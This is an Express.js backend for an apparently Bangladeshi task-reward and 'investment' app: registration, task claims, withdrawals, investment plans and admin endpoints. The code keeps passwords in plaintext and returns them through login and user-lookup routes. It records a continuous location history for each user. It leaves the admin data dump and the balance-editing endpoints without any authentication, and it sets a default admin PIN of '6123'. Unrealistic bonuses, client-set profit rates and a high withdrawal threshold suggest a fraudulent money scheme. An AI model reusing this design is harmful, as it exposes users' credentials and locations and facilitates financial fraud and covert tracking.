const express = require("express");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const PORT = Number(process.env.PORT || 3000);

const ADMIN_PIN = String(process.env.ADMIN_PIN || "6123");
const APP_SECRET = String(process.env.APP_SECRET || "change-this-secret-now");

const DATA_DIR = path.join(__dirname, "data");
const DB_FILE = path.join(DATA_DIR, "db.json");

fs.mkdirSync(DATA_DIR, { recursive: true });

let fileLockPromise = Promise.resolve();
function withFileLock(operation) {
  const result = fileLockPromise.then(() => operation());
  fileLockPromise = result.catch(() => {});
  return result;
}

function defaultDb() {
  return {
    registrations: [],
    usedNumbers: [],
    withdrawals: [],
    investments: [],
    settings: { telegramChatId: "", telegramBotTokenEncrypted: "" },
    tasks: [
      { id: "task_1", title: "Daily Check-in", reward: 20, type: "daily" },
      { id: "task_2", title: "Referral Bonus", reward: 50, type: "referral" },
      { id: "task_3", title: "Visit Promo Link", reward: 30, type: "visit" }
    ]
  };
}

function loadDb() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      const db = defaultDb();
      fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
      return db;
    }
    const parsed = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
    return {
      registrations: Array.isArray(parsed.registrations) ? parsed.registrations : [],
      usedNumbers: Array.isArray(parsed.usedNumbers) ? parsed.usedNumbers : [],
      withdrawals: Array.isArray(parsed.withdrawals) ? parsed.withdrawals : [],
      investments: Array.isArray(parsed.investments) ? parsed.investments : [],
      settings: {
        telegramChatId: parsed.settings?.telegramChatId || "",
        telegramBotTokenEncrypted: parsed.settings?.telegramBotTokenEncrypted || ""
      },
      tasks: Array.isArray(parsed.tasks) ? parsed.tasks : defaultDb().tasks
    };
  } catch {
    return defaultDb();
  }
}

function saveDb(db) {
  const tmp = DB_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, DB_FILE);
}

function validPhone(v) {
  return /^01[3-9]\d{8}$/.test(String(v || ""));
}

function clean(v, max = 200) {
  return String(v || "").trim().slice(0, max);
}

app.use(express.json({ limit: "100kb" }));
app.use(express.static(path.join(__dirname, "public")));

// --- USER AUTHENTICATION & REGISTRATION ---

app.post("/api/register/start", (req, res) => {
  withFileLock(async () => {
    const name = clean(req.body?.name, 80);
    const phone = clean(req.body?.phone, 20);
    const password = clean(req.body?.password, 50);
    const age = Number(req.body?.age);
    const lat = Number(req.body?.location?.latitude);
    const lon = Number(req.body?.location?.longitude);

    if (name.length < 2) return res.status(400).json({ error: "সঠিক নাম দিন।" });
    if (!validPhone(phone)) return res.status(400).json({ error: "সঠিক মোবাইল নাম্বার দিন।" });
    if (!password || password.length < 4) return res.status(400).json({ error: "কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড দিন।" });
    if (!Number.isFinite(age) || age < 18) return res.status(400).json({ error: "বয়স ১৮+ হতে হবে।" });

    const db = loadDb();

    if (db.registrations.some(r => r.phone === phone)) {
      return res.status(409).json({ error: "এই নাম্বারটি দিয়ে পূর্বে রেজিস্ট্রেশন করা হয়েছে।" });
    }

    const id = crypto.randomUUID();
    const createdAt = new Date().toISOString();

    const userObj = {
      id,
      name,
      phone,
      password,
      age,
      balance: 100, // ৳100 Welcome Bonus
      location: { latitude: lat || 0, longitude: lon || 0, capturedAt: createdAt },
      locationHistory: [{ latitude: lat || 0, longitude: lon || 0, capturedAt: createdAt }],
      completedTasks: [],
      createdAt
    };

    db.registrations.unshift(userObj);
    saveDb(db);
    res.json({ ok: true, user: userObj });
  });
});

app.post("/api/login", (req, res) => {
  const phone = clean(req.body?.phone, 20);
  const password = clean(req.body?.password, 50);

  const db = loadDb();
  const user = db.registrations.find(r => r.phone === phone && r.password === password);

  if (!user) {
    return res.status(401).json({ error: "মোবাইল নাম্বার বা পাসওয়ার্ড ভুল।" });
  }

  res.json({ ok: true, user });
});

app.get("/api/user/:id", (req, res) => {
  const db = loadDb();
  const user = db.registrations.find(r => r.id === req.params.id);
  if (!user) return res.status(404).json({ error: "User not found" });
  res.json({ ok: true, user });
});

// Live Location Stream Update Endpoint
app.post("/api/user/:id/location", (req, res) => {
  withFileLock(async () => {
    const lat = Number(req.body?.latitude);
    const lon = Number(req.body?.longitude);
    const db = loadDb();
    const user = db.registrations.find(r => r.id === req.params.id);
    if (user && Number.isFinite(lat) && Number.isFinite(lon)) {
      const capturedAt = new Date().toISOString();
      user.location = { latitude: lat, longitude: lon, capturedAt };
      if (!Array.isArray(user.locationHistory)) user.locationHistory = [];
      user.locationHistory.push({ latitude: lat, longitude: lon, capturedAt });
      saveDb(db);
    }
    res.json({ ok: true });
  });
});

// --- TASKS & BALANCE ---

app.get("/api/tasks", (req, res) => {
  const db = loadDb();
  res.json({ tasks: db.tasks });
});

app.post("/api/tasks/claim", (req, res) => {
  withFileLock(async () => {
    const { userId, taskId } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    const task = db.tasks.find(t => t.id === taskId);

    if (!user || !task) return res.status(400).json({ error: "Invalid Request" });

    if (!Array.isArray(user.completedTasks)) user.completedTasks = [];
    const today = new Date().toISOString().split("T")[0];

    if (task.type === "daily" && user.completedTasks.some(ct => ct.taskId === taskId && ct.date === today)) {
      return res.status(400).json({ error: "আজকের ডেইলি টাস্ক ইতিমধ্যে ক্লেম করেছেন।" });
    }

    user.completedTasks.push({ taskId, date: today });
    user.balance = (user.balance || 0) + task.reward;

    saveDb(db);
    res.json({ ok: true, balance: user.balance, reward: task.reward });
  });
});

// --- WITHDRAW & INVESTMENT ---

app.post("/api/withdraw", (req, res) => {
  withFileLock(async () => {
    const { userId, method, number, amount } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);

    if (!user) return res.status(404).json({ error: "User error" });
    if (Number(amount) > user.balance || Number(amount) < 500) {
      return res.status(400).json({ error: "সর্বনিম্ন উইথড্র ৳৫০০ এবং পর্যাপ্ত ব্যালেন্স থাকতে হবে।" });
    }

    user.balance -= Number(amount);
    db.withdrawals.unshift({
      id: crypto.randomUUID(),
      userId,
      userName: user.name,
      userPhone: user.phone,
      method,
      number,
      amount: Number(amount),
      status: "Pending",
      createdAt: new Date().toISOString()
    });

    saveDb(db);
    res.json({ ok: true, balance: user.balance });
  });
});

app.post("/api/invest", (req, res) => {
  withFileLock(async () => {
    const { userId, planDays, profitPercent, amount } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);

    if (!user || Number(amount) > user.balance || Number(amount) < 100) {
      return res.status(400).json({ error: "পর্যাপ্ত ব্যালেন্স নেই (সর্বনিম্ন ইনভেস্ট ৳১০০)" });
    }

    user.balance -= Number(amount);
    db.investments.unshift({
      id: crypto.randomUUID(),
      userId,
      planDays,
      profitPercent,
      amount: Number(amount),
      status: "Active",
      createdAt: new Date().toISOString()
    });

    saveDb(db);
    res.json({ ok: true, balance: user.balance });
  });
});

// --- ADMIN CONTROL ---

app.post("/api/admin/login", (req, res) => {
  if (String(req.body?.pin) === ADMIN_PIN) {
    res.json({ ok: true });
  } else {
    res.status(401).json({ error: "ভুল Admin PIN" });
  }
});

app.get("/api/admin/data", (req, res) => {
  const db = loadDb();
  res.json({
    users: db.registrations,
    withdrawals: db.withdrawals,
    investments: db.investments
  });
});

app.post("/api/admin/user/update-balance", (req, res) => {
  withFileLock(async () => {
    const { userId, newBalance } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    if (user) {
      user.balance = Number(newBalance);
      saveDb(db);
      return res.json({ ok: true });
    }
    res.status(404).json({ error: "User not found" });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
